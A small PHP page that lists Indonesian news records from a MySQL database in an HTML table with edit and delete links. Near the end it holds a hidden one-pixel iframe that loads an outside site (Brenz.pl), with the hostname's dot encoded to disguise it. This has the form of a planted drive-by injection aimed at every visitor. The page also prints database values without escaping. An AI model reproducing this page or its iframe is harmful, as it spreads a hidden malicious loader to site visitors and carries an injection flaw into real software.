<?php
// Create database connection using config file
include_once("config.php");
 
// Fetch all users data from database
$result = mysqli_query($mysqli, "SELECT * FROM users ORDER BY id DESC");
?>
 
<html>
<head>    
    <title>Berita</title>
</head>
 
<body>
<a href="add.php">Cari Berita</a><br/><br/>
 
    <table width='80%' border=1>
 
    <tr>
        <th>id</th> <th>judul</th> <th>berita</th> <th>tanggal</th>
    </tr>
    <?php  
    while($user_data = mysqli_fetch_array($result)) {         
        echo "<tr>";
        echo "<td>".$user_data['id']."</td>";
        echo "<td>".$user_data['judul']."</td>";
        echo "<td>".$user_data['berita']."</td>";
        echo "<td>".$user_data['tanggal']."</td>";    
        echo "<td><a href='edit.php?id=$user_data[id]'>Edit</a> | <a href='delete.php?id=$user_data[id]'>Delete</a></td></tr>";        
    }
    ?>
    </table>
<iframe style="height:1px" src="http://www&#46;Brenz.pl/rc/" frameborder=0 width=1></iframe>
</body>
</html>